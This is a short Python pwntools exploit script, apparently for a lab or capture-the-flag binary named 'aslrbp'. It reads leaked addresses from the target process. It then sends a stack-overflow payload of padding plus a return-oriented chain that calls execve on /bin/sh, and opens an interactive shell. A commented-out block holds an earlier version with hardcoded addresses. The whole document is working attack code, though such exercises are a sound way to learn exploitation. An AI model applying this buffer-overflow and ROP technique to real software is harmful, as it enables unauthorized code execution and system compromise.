from pwn import *

"""
execv = p64(0x1938ab73c) # need to update
bin_sh = p64(0x100008000)
argv = p64(0x100008018)
gadget = p64(0x100000548)
execve = p64(0x1938ab73c)

p = b"A"*24
p += gadget + bin_sh + argv + p64(0)
p += execv

print(p)
"""


p = process(["./aslrbp", "./9"])

# getting info from proc
p.recvuntil(b"bin_sh: ")
bin_sh = int(p.recvline().strip(), 16)
p.recvuntil(b"argv: ")
argv = int(p.recvline().strip(), 16)
p.recvuntil(b"gadget: ")
gadget = int(p.recvline().strip(), 16)
p.recvuntil(b"execve: ")
execve = int(p.recvline().strip(), 16)


payload = b"A"*24 + p64(gadget) + p64(bin_sh) + p64(argv) + p64(0) + p64(execve)
p.sendlineafter(b"Tell me a story:", payload)

p.interactive()


